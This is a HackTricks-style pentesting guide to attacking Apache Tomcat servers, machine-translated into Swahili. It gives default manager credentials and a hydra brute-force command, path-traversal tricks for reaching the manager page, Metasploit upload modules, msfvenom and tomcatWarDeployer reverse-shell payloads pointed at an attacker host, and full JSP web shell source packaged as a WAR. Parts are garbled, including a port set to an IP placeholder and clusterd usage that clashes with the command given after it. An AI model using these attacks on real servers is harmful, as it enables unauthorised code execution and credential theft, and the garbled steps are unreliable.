# Tomcat

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pata mianya inayojali zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Ugunduzi

* Kawaida inafanya kazi kwenye **bandari 8080**
* **Kosa la kawaida la Tomcat:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Uchambuzi

### **Uthibitishaji wa Toleo**
Ili kupata toleo la Apache Tomcat, amri rahisi inaweza kutekelezwa:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
Hii itatafuta neno "Tomcat" katika ukurasa wa mwongozo wa hati, ikifunua toleo katika lebo ya kichwa ya jibu la HTML.

### **Mahali ya Faili za Meneja**
Kutambua maeneo sahihi ya saraka za **`/manager`** na **`/host-manager`** ni muhimu kwani majina yao yanaweza kubadilishwa. Inashauriwa kutumia utafutaji wa nguvu ili kupata kurasa hizi.

### **Uthibitishaji wa Jina la Mtumiaji**
Kwa toleo la Tomcat chini ya 6, ni muhimu kuthibitisha majina ya watumiaji kupitia:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Maelezo ya Uthibitisho wa Chaguo-msingi**
Kitengo cha **`/manager/html`** ni nyeti sana kwani inaruhusu kupakia na kuweka faili za WAR, ambazo zinaweza kusababisha utekelezaji wa nambari. Kitengo hiki kinahifadhiwa na uthibitisho wa msingi wa HTTP, na uthibitisho wa kawaida ni:
- admin:admin
- tomcat:tomcat
- admin:<HAKUNA KITU>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

Uthibitisho huu unaweza kujaribiwa kwa kutumia:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Kitengo kingine kinachoweza kuzingatiwa ni **`/manager/status`**, ambacho kinaonyesha toleo la Tomcat na OS, kusaidia kutambua udhaifu.

### **Shambulio la Brute Force**
Kujaribu shambulio la brute force kwenye saraka ya meneja, mtu anaweza kutumia:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Pamoja na kuweka vigezo mbalimbali katika Metasploit ili kulenga mwenyeji maalum.

## Mianya Maarufu

### **Kufichua Nyuma ya Nenosiri**
Kufikia `/auth.jsp` kunaweza kufichua nyuma ya nenosiri chini ya hali nzuri.

### **Ukodishaji wa URL Mara Mbili**
Mianya CVE-2007-1860 katika `mod_jk` inaruhusu ukodishaji wa URL mara mbili kwa njia ya kuvuka njia, kuruhusu ufikiaji usiohalali kwenye kiolesura cha usimamizi kupitia URL iliyoundwa kwa umakini.

Ili kupata wavuti ya usimamizi wa Tomcat, nenda: `pathTomcat/%252E%252E/manager/html`

### /examples
Toleo la Apache Tomcat 4.x hadi 7.x lina skripti za mfano ambazo zinaweza kufichua habari na kushambulia msimbo wa msalaba (XSS). Skripti hizi, zilizoorodheshwa kwa kina, zinapaswa kuchunguzwa kwa ufikiaji usiohalali na uwezekano wa kutumiwa vibaya. Pata [habari zaidi hapa](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Shambulio la Kuvuka Njia**
Katika [**mazingira yaliyo hatarini ya Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/), unaweza kupata ufikiaji wa saraka zilizolindwa kwenye Tomcat kwa kutumia njia: `/..;/`

Kwa hivyo, kwa mfano, unaweza **kufikia ukurasa wa usimamizi wa Tomcat** kwa kufikia: `www.vulnerable.com/lalala/..;/manager/html`

**Njia nyingine** ya kuzunguka njia zilizolindwa kwa kutumia hila hii ni kufikia `http://www.vulnerable.com/;param=value/manager/html`


## RCE

Hatimaye, ikiwa una ufikiaji wa Meneja wa Programu ya Wavuti ya Tomcat, unaweza **kupakia na kutekeleza faili ya .war (kutekeleza msimbo)**.

### Vizuizi

Utaweza tu kutekeleza WAR ikiwa una **mamlaka ya kutosha** (vyeo: **admin**, **manager**, na **manager-script**). Maelezo hayo yanaweza kupatikana chini ya _tomcat-users.xml_ kawaida iliyoainishwa katika `/usr/share/tomcat9/etc/tomcat-users.xml` (inatofautiana kati ya toleo) (angalia sehemu ya [POST](tomcat.md#post)).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit ni chombo maarufu cha kufanya uchunguzi wa usalama na kutekeleza mashambulizi ya kudhibiti mwenyeji. Inatoa mkusanyiko wa moduli na zana zinazosaidia wataalamu wa usalama kuchunguza na kuchunguza udhaifu katika mifumo ya kompyuta. Metasploit inaweza kutumika kwa uchunguzi wa usalama, upimaji wa uvamizi, na kujaribu mifumo ya kompyuta kwa udhaifu. Chombo hiki kinaweza kufanya mashambulizi ya kudhibiti mwenyeji kwa kutumia udhaifu uliogunduliwa. Metasploit inasaidia aina mbalimbali za mashambulizi, kama vile mashambulizi ya kijamii ya uhandisi, mashambulizi ya kuchora, na mashambulizi ya kudhibiti mwenyeji.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Reverse Shell

1. Unda war ili kuweza kusambaza:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. Pakua faili la `revshell.war` na ufikie (`/revshell/`):

### Bind na reverse shell na [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

Katika hali fulani hii haifanyi kazi (kwa mfano toleo la zamani la sun)

#### Pakua
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Kitanzi cha Nyuma

Kitanzi cha nyuma ni mbinu ya kudhibiti kompyuta ya lengo kutoka kwa kompyuta ya mshambuliaji. Mshambuliaji hutumia kitanzi cha nyuma kuanzisha uhusiano wa mbali na kompyuta ya lengo na kudhibiti shughuli zake. Hii inaruhusu mshambuliaji kupata ufikiaji usimamizi wa kompyuta ya lengo na kutekeleza amri na programu mbalimbali.

Kuna njia mbalimbali za kuanzisha kitanzi cha nyuma, ikiwa ni pamoja na kutumia programu maalum za kitanzi cha nyuma kama Netcat au kutumia maktaba za lugha ya programu kama Python au Ruby. Baada ya kuanzisha kitanzi cha nyuma, mshambuliaji anaweza kufanya shughuli mbalimbali kama vile kupakua na kupakia faili, kuendesha amri za mfumo, na hata kudhibiti kikamilifu kompyuta ya lengo.

Kwa mshambuliaji, kitanzi cha nyuma ni zana muhimu katika kutekeleza mashambulizi ya kijijini na kuchunguza mifumo ya kompyuta. Kwa upande mwingine, kwa mtumiaji wa kawaida, kitanzi cha nyuma ni hatari kubwa, kwani inaweza kusababisha upotevu wa data na kudhibitiwa kwa kompyuta yao bila idhini yao. Ni muhimu kuchukua hatua za usalama kama vile kusasisha programu na kuzuia ufikiaji usiohitajika ili kujilinda dhidi ya mashambulizi ya kitanzi cha nyuma.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Bind shell

Bind shell ni aina ya shell ambayo inaruhusu mtumiaji kudhibiti kompyuta ya lengo kwa kusikiliza kwa uhusiano kwenye bandari fulani. Mara tu uhusiano unapoundwa, mtumiaji anaweza kutekeleza amri na kudhibiti kompyuta ya lengo. Hii ni njia ya kawaida ya kudhibiti kompyuta kwa njia ya kijijini na inaweza kutumiwa kwa madhumuni ya udukuzi.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Kutumia [Culsterd](https://github.com/hatRiot/clusterd)

Culsterd ni chombo cha nguvu kinachotumiwa katika uchunguzi wa usalama wa mtandao. Inatoa njia mbalimbali za kufanya uchunguzi wa kina na kugundua udhaifu katika mifumo ya mtandao. Hapa chini ni maelezo ya jinsi ya kutumia Culsterd katika uchunguzi wa mifumo ya Tomcat.

#### Kuanzisha Culsterd

1. Pakua na Sakinisha Culsterd kutoka [hapa](https://github.com/hatRiot/clusterd).
2. Fungua terminal na nenda kwenye saraka ya Culsterd.
3. Sakinisha mahitaji ya Culsterd kwa kutumia amri `pip install -r requirements.txt`.
4. Unda faili ya usanidi ya Culsterd kwa kuchagua mbinu za uchunguzi na kutoa maelezo muhimu kama anwani ya IP ya lengo na bandari.
5. Anza Culsterd kwa kutumia amri `python clusterd.py -c config.yaml`.

#### Kufanya Uchunguzi wa Tomcat

1. Chagua mbinu ya uchunguzi wa Tomcat kutoka kwenye orodha ya mbinu zilizopo.
2. Fanya uchunguzi kwa kutumia amri `python clusterd.py -m tomcat -t <target_IP> -p <target_port>`.
3. Culsterd itatekeleza mbinu za uchunguzi zilizochaguliwa na kutoa matokeo ya uchunguzi.

Kwa kutumia Culsterd, unaweza kufanya uchunguzi wa kina wa mifumo ya Tomcat na kugundua udhaifu ambao unaweza kutumiwa katika shambulio la mtandao. Ni chombo muhimu katika uchunguzi wa usalama wa mtandao na inaweza kusaidia kuboresha usalama wa mifumo ya mtandao.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Njia ya kawaida - Web shell

Tengeneza **index.jsp** na [maudhui haya](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Unaweza pia kusakinisha hii (inaruhusu kupakia, kupakua na kutekeleza amri): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Njia ya Kufanya Kwa Mkono 2

Pata kifaa cha wavuti cha JSP kama [hiki](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) na tengeneza faili ya WAR:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Jina la faili ya siri ya Tomcat ni _tomcat-users.xml_
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Njia nyingine za kukusanya sifa za Tomcat:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Vifaa vingine vya uchunguzi wa Tomcat

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Marejeo
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
